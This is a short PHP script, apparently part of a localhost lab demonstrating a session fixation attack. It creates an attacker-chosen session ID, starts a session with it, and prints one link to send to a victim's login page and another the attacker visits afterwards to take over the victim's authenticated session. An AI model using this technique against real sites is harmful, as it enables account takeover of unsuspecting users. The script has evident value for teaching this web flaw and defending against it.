// === attacker_setup.php ===
<?php
// attacker_setup.php
// This creates a safe session id for attacker and stores minimal attacker marker.
// It validates and uses only characters allowed by PHP session ids (A-Z a-z 0-9 - ,)


// generate a hex id and prefix with ATTACKER- (dash is allowed)
$attacker_sid = 'ATTACKER-' . bin2hex(random_bytes(6)); // length small but sufficient
// ensure allowed chars
if (preg_match('/^[A-Za-z0-9,-]+$/', $attacker_sid) !== 1) {
// fallback: produce alphanumeric-only
$attacker_sid = 'ATTACKER' . substr(bin2hex(random_bytes(8)), 0, 16);
}


// set the session id and start session
session_id($attacker_sid);
session_start();
// set an attacker marker so a session file is created and inspectable
$_SESSION['attacker'] = true;


echo "<h3>Attacker setup</h3>";
echo "Attacker SID created: <b>" . htmlspecialchars(session_id()) . "</b><br>";
echo "Attacker session contents:<pre>"; print_r($_SESSION); echo "</pre>";


// Craft links — adjust path depending on your server
$base = 'http://localhost/Session_Fixation_Attack';


echo "<p>Send this link to victim (copy):<br>";
echo "<code>" . htmlspecialchars($base . "/login.php?sid=" . urlencode(session_id())) . "</code></p>";


echo "<p>Attacker can view victim later by visiting:<br>";
echo "<code>" . htmlspecialchars($base . "/protected.php?sid=" . urlencode(session_id())) . "</code></p>";


?>

